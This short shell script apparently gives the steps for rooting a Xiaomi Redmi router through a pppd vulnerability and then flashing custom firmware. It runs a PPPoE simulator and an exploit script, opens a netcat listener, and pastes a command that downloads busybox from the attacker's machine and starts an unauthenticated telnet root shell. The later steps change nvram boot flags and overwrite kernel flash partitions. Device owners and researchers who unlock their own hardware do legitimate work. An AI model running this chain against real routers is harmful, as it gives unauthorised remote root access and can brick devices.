#!/binsh

# WAN->LAN1
# LAN2->PC

pip3 install scapy --user
python3 redmi/PPPoE_Simulator.py
# http://192.168.31.1 PPPoE 123:123

python3 -m http.server 8081
nc -l 31337

# Set PC to Static IP: 192.168.31.177
python3 redmi/pppd-cve.py

#Shell Paste: cd /tmp&&wget http://192.168.31.177:8081/busybox&&chmod a+x ./busybox&&./busybox telnetd -l /bin/sh

telnet 192.168.31.1
wget http://192.168.31.177:8081/r3g.bin&&nvram set uart_en=1&&nvram set bootdelay=5&&nvram set flag_try_sys1_failed=1&&nvram commit
mtd -r write r3g.bin kernel1

# Set PC to Static IP: 192.168.1.23
scp redmi.trx root@192.168.1.1:/tmp #admin
ssh root@192.168.1.1 "mtd -r write /tmp/redmi.trx kernel"


